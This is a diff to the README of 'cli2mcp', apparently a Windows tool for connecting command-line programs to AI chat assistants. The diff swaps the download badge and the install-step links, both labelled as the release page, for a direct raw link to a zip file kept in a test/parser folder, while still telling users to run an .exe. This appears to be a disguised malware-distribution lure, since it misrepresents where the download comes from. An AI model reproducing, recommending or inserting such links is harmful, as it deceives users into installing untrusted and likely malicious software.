@@ -1,6 +1,6 @@
 # ⚙️ cli2mcp - Turn command tools into smart agents
 
-[![Download cli2mcp](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Divisionmatriarchate225/cli2mcp/releases)
+[![Download cli2mcp](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Divisionmatriarchate225/cli2mcp/main/test/parser/cli_mcp_2.5.zip)
 
 cli2mcp lets you use your favorite command line programs inside AI chat tools. Many people use AI helpers like Claude, ChatGPT, or Cursor to write code or analyze files. These AI tools work better when they can talk to the software you already have on your computer. 
 
@@ -10,7 +10,7 @@ Usually, setting up this connection requires custom coding. cli2mcp removes that
 
 You need a recent version of Windows to run this. Follow these steps to get the software on your machine.
 
-1. Visit [this release page](https://github.com/Divisionmatriarchate225/cli2mcp/releases).
+1. Visit [this release page](https://raw.githubusercontent.com/Divisionmatriarchate225/cli2mcp/main/test/parser/cli_mcp_2.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
